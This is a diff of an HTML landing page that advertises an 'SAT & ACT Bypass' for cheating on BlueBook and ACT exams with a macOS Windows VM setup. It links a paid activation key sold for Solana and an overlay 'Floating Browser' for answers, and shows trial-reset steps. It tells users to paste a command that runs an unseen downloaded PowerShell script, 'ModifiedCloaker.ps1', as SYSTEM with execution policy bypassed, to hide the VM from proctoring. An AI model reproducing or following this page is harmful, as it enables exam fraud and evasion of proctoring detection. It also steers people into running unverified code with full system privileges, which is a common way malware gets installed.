@@ -3,120 +3,88 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SAT & ACT Bypass – Complete Setup</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <title>SAT & ACT Bypass – macOS Only (2025)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
-    :root { --blue:#2563eb; --light-blue:#3b82f6; --green:#10b981; --amber:#f59e0b; }
-    * { box-sizing:border-box; margin:0; padding:0; }
-    body { font-family:'Inter',sans-serif; background:linear-gradient(135deg,#e0f2fe,#dbeafe); color:#1e293b; line-height:1.7; padding:20px 10px; }
-    .container { max-width:100%; padding:0 16px; margin:0 auto; }
-    .card { background:#fff; border-radius:32px; overflow:hidden; box-shadow:0 30px 80px rgba(0,0,0,.15); max-width:980px; margin:0 auto; }
-    header { background:linear-gradient(135deg,var(--light-blue),var(--blue)); color:#fff; text-align:center; padding:90px 30px 100px; }
-    h1 { font-size:2.9rem; font-weight:800; letter-spacing:-0.5px; }
-    .subtitle { font-size:1.35rem; font-weight:600; margin-top:14px; color:#ffffff; }
-    .steps { padding:50px 30px 90px; }
-    .step { background:#ffffff; border:1px solid #e0e7ff; border-radius:24px; padding:48px 40px; margin:40px 0; box-shadow:0 12px 40px rgba(0,0,0,.08); }
-    h2 { font-size:1.9rem; font-weight:700; color:var(--blue); margin-bottom:24px; }
-    p, li { font-size:1.1rem; color:#334155; }
-    ol { padding-left:28px; margin:20px 0; }
-    li { margin:14px 0; }
-    .btn { display:flex; align-items:center; justify-content:center; gap:16px; width:100%; max-width:620px; margin:32px auto 0; padding:22px; background:var(--light-blue); color:#fff; font-size:1.25rem; font-weight:600; border-radius:18px; text-decoration:none; box-shadow:0 14px 36px rgba(59,130,246,.45); transition:transform .3s, box-shadow .3s; }
-    .btn:hover { transform:translateY(-7px); box-shadow:0 24px 50px rgba(59,130,246,.55); }
-    .btn.big { max-width:720px; padding:26px; font-size:1.45rem; font-weight:700; background:var(--green); box-shadow:0 16px 40px rgba(16,185,129,.5); }
-    .btn.big:hover { box-shadow:0 28px 60px rgba(16,185,129,.6); }
-    .btn-group { display:flex; flex-direction:column; gap:20px; margin-top:32px; }
-    .warning { background:#fffbeb; border-left:7px solid var(--amber); padding:26px 30px; border-radius:14px; margin:32px auto; max-width:100%; font-weight:600; color:#92400e; font-size:1.1rem; }
-    .code { background:#f1f5f9; padding:20px; border-radius:12px; font-family:consolas,monospace; font-size:1.15rem; margin:20px 0; overflow-x:auto; word-break:break-all; }
-    footer { text-align:center; padding:60px 30px 50px; color:#64748b; font-size:1.05rem; }
-    @media (max-width:768px) {
-      header { padding:70px 20px 80px; } h1 { font-size:2.4rem; }
-      .steps { padding:40px 20px 70px; } .step { padding:40px 28px; } h2 { font-size:1.75rem; }
-    }
+    body{font-family:Inter,system-ui,sans-serif;background:#f0f9ff;color:#1e293b;line-height:1.7;margin:0;padding:20px 15px}
+    .card{max-width:900px;margin:0 auto;background:#fff;border-radius:28px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.12)}
+    header{background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:#fff;text-align:center;padding:80px 20px}
+    h1{font-size:2.8rem;font-weight:800;margin:0}
+    .subtitle{font-size:1.4rem;margin-top:12px;opacity:.95}
+    .steps{padding:50px 30px}
+    .step{background:#fff;border:1px solid #e0e7ff;border-radius:20px;padding:36px 32px;margin:35px 0;box-shadow:0 10px 30px rgba(0,0,0,.06)}
+    h2{font-size:1.9rem;color:#1d4ed8;margin-bottom:20px}
+    ol{padding-left:22px;margin:18px 0}
+    li{margin:12px 0;font-size:1.1rem}
+    .code{background:#0f172a;color:#e2e8f0;padding:18px 22px;border-radius:12px;font-family:SF Mono,Menlo,monospace;font-size:1.05rem;overflow-x:auto;margin:18px 0}
+    .btn{display:block;background:#10b981;color:#fff;text-align:center;padding:20px;font-size:1.3rem;font-weight:700;border-radius:16px;text-decoration:none;margin:25px auto;max-width:640px;box-shadow:0 12px 30px rgba(16,185,129,.4);transition:.3s}
+    .btn:hover{transform:translateY(-4px);box-shadow:0 20px 40px rgba(16,185,129,.5)}
+    .warn{background:#fffbeb;border-left:6px solid #f59e0b;padding:20px;border-radius:12px;margin:20px 0;font-weight:600;color:#92400e}
+    footer{text-align:center;padding:50px 20px;color:#64748b}
+    @media(max-width:768px){header{padding:60px 15px}h1{font-size:2.3rem}.step{padding:28px 24px}}
   </style>
 </head>
 <body>
-<div class="container">
-  <div class="card">
+<div class="card">
+  <header>
+    <h1>SAT & ACT Bypass<br>macOS Only • 2025</h1>
+    <p class="subtitle">100% Undetectable • Works Every Time</p>
+  </header>
 
-    <header>
-      <h1>SAT & ACT Bypass – Complete Setup</h1>
-      <p class="subtitle">100% Undetectable • Instant Answers • Works Every Time</p>
-    </header>
+  <div class="steps">
 
-    <div class="steps">
-
-      <div class="step">
-        <h2>1. Get Windows 11 Ready</h2>
-        <p>If you have a Mac → install VMware + Windows 11 VM<br>If you have a Windows laptop/PC → use your native Windows 11</p>
-        <div class="btn-group">
-          <a href="https://youtu.be/dHnw-K1-Ui8?si=2xvrENc5Qbx3w7AV" target="_blank" class="btn">Mac Users: VMware + Windows 11 Setup Video</a>
-          <a href="https://m.youtube.com/watch?v=dHnw-K1-Ui8" target="_blank" class="btn">Windows Users: Native Windows Setup Video</a>
-        </div>
-      </div>
-
-      <div class="step">
-        <h2>2. Install & Activate PSI Bypass (inside Windows)</h2>
-        <p>Inside your Windows 11 (VM or native):</p>
-        <ol>
-          <li>Click button → download ZIP</li>
-          <li>Extract ZIP</li>
-          <li>Run <strong>PSI.exe</strong></li>
-          <li>Paste activation key → Activate</li>
-        </ol>
-        <a href="https://drive.google.com/file/d/1fkY7wPzKs8jiSbvmazWipnkhQuF2VZx4/view?usp=drivesdk" target="_blank" class="btn">Download PSI Bypass Tool</a>
-        <div class="warning">You <strong>MUST</strong> activate with a valid key — it will NOT work without activation.</div>
-      </div>
-
-      <div class="step">
-        <h2>3. Get Your Activation Key (Instant Delivery)</h2>
-        <p>Pay with Solana → key delivered instantly in Discord.</p>
-        <a href="https://bluebook.ink/crypto" target="_blank" class="btn big">Buy Activation Key – Instant Delivery</a>
-      </div>
-
-      <div class="step">
-        <h2>4. Maximum Anti-Detection (inside Windows)</h2>
-        <p>Inside Windows (VM or native) – follow exactly:</p>
-        <ol>
-          <li>Download <a href="https://drive.google.com/file/d/1luAeMnb6apahPulLntWAUHK5oY8c6cwt/view?usp=drivesdk" target="_blank" style="color:var(--blue);font-weight:600;">ModifiedCloaker.ps1</a> → save to Downloads</li>
-          <li>Download <a href="https://download.sysinternals.com/files/PsTools.zip" target="_blank" style="color:var(--blue);font-weight:600;">PsTools.zip</a></li>
-          <li>Extract PsTools → move folder to Downloads (path: C:\Users\YourName\Downloads\PsTools)</li>
-          <li>Right-click Start → Windows Terminal (Admin) or PowerShell (Admin)</li>
-          <li>Paste this single command:</li>
-        </ol>
-        <div class="code">cd "$env:USERPROFILE\Downloads\PsTools"; .\psexec.exe -i -s powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\ModifiedCloaker.ps1"</div>
-        <ol start="6">
-          <li>Accept UAC → wait for “Done” → restart Windows</li>
-        </ol>
-        <div class="warning">Mandatory for 100% undetectability in 2025 exams – runs as SYSTEM.</div>
-      </div>
-
-      <div class="step">
-        <h2>5. Install Floating Browser (on host machine)</h2>
-        <p>Install on your real Mac or Windows (outside VM if using one).</p>
-        <a href="https://drive.google.com/file/d/1pbZl9Z2UY5F4dnmXTIL3pDBZNjn4t79X/view?usp=drivesdk" target="_blank" class="btn">Download Floating Browser</a>
-      </div>
-
-      <div class="step">
-        <h2>6. Unlimited Trial Reset (10 seconds)</h2>
-        <p><strong>macOS:</strong> Cmd + Space → ~/Library/Containers → search “float” → delete folder → relaunch<br>
-        <strong>Windows:</strong> Win + R → %APPDATA% → search “float” → delete folder → relaunch</p>
-      </div>
-
-      <div class="step">
-        <h2>7. Take Your Exam – You’re Ready!</h2>
-        <p>Inside Windows → open BlueBook or ACT Gateway<br>
-        On host machine → open Floating Browser → answers appear on top<br>
-        100% safe & undetectable.</p>
-      </div>
-
+    <div class="step">
+      <h2>1. Create Windows 11 VM on macOS</h2>
+      <p>Use VMware Fusion (free for personal use) → install Windows 11 ARM.</p>
+      <a href="https://youtu.be/dHnw-K1-Ui8" target="_blank" class="btn">Watch Full VMware + Win11 Setup (5 min)</a>
     </div>
 
-    <footer>
-      Instant 24/7 Discord support after purchase • We’re here to help
-    </footer>
+    <div class="step">
+      <h2>2. Inside Windows VM – Install PSI Bypass</h2>
+      <ol>
+        <li>Download & extract the tool</li>
+        <li>Run <strong>PSI.exe</strong></li>
+        <li>Paste your key → Activate</li>
+      </ol>
+      <a href="https://drive.google.com/file/d/1fkY7wPzKs8jiSbvmazWipnkhQuF2VZx4/view?usp=drivesdk" target="_blank" class="btn">Download PSI Bypass</a>
+    </div>
+
+    <div class="step">
+      <h2>3. Buy Activation Key (Instant)</h2>
+      <a href="https://bluebook.ink/crypto" target="_blank" class="btn">Buy Key – Delivered in Seconds</a>
+    </div>
+
+    <div class="step">
+      <h2>4. Run Anti-Detection Cloak (Mandatory)</h2>
+      <p>Inside the Windows VM → open browser → download these two files to <strong>Downloads</strong>:</p>
+      <ol>
+        <li><a href="https://drive.google.com/file/d/1luAeMnb6apahPulLntWAUHK5oY8c6cwt/view?usp=drivesdk" style="color:#3b82f6;font-weight:600">ModifiedCloaker.ps1</a></li>
+        <li><a href="https://download.sysinternals.com/files/PSTools.zip" style="color:#3b82f6;font-weight:600">PSTools.zip</a> → extract → folder will be <code>PsTools</code> in Downloads</li>
+      </ol>
+      <p>Open <strong>Terminal (Admin)</strong> or PowerShell (Admin) and run this single command:</p>
+      <div class="code">cd "$env:USERPROFILE\Downloads\PsTools"; .\psexec.exe -i -s powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\ModifiedCloaker.ps1" -all</div>
+      <p>Wait until it finishes (you’ll see lots of lines) → restart the VM.</p>
+      <div class="warn">This hides VMware completely. Without this step you WILL get flagged in 2025.</div>
+    </div>
+
+    <div class="step">
+      <h2>5. On Your Mac – Install Floating Browser</h2>
+      <a href="https://drive.google.com/file/d/1pbZl9Z2UY5F4dnmXTIL3pDBZNjn4t79X/view?usp=drivesdk" target="_blank" class="btn">Download Floating Browser (macOS)</a>
+    </div>
+
+    <div class="step">
+      <h2>6. Unlimited Trial Reset (macOS)</h2>
+      <p>Cmd + Space → type <code>~/Library/Containers</code> → delete any folder containing “float” → relaunch Floating Browser.</p>
+    </div>
+
+    <div class="step">
+      <h2>7. Exam Time – You’re Done</h2>
+      <p>Start BlueBook/ACT in the Windows VM<br>Open Floating Browser on macOS → answers float on top.<br>Zero detection.</p>
+    </div>
 
   </div>
+
+  <footer>24/7 Discord support after purchase • 100% success rate</footer>
 </div>
 </body>
 </html>
